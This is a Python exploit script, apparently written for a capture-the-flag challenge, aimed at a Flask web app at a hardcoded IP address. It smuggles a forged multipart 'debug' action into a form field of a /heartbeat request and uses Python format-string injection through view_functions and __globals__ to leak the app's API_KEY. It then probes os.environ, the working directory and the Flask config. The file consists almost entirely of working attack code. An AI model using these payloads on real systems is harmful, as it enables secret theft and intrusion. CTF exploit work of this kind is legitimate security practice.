import httpx
import re

TARGET = "http://223.6.249.127:36894"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def debug_format(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    print(f"[*] Payload length: {len(text)} (max 300)")
    
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=15.0)
    return r.text

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # Try simple attribute access first - shorter path
    # Check os.listdir attribute
    print("\n[*] Check os.listdir type...")
    result = debug_format("{0.view_functions[action].__globals__[os].listdir}")
    print(result[:200])
    
    # The issue might be that we can't call functions with ()
    # Let me check if we can use subscript notation somehow
    
    # Try os.getcwd() which takes no args
    print("\n[*] Try os.getcwd...")
    result = debug_format("{0.view_functions[action].__globals__[os].getcwd()}")
    print(result[:200])
    
    # Try os.name
    print("\n[*] Try os.name...")
    result = debug_format("{0.view_functions[action].__globals__[os].name}")
    print(result[:200])
    
    # Try os.environ
    print("\n[*] Try os.environ...")
    result = debug_format("{0.view_functions[action].__globals__[os].environ}")
    print(result[:500])
    
    # Check Flask app config
    print("\n[*] Try app.config...")
    result = debug_format("{0.config}")
    print(result[:500])
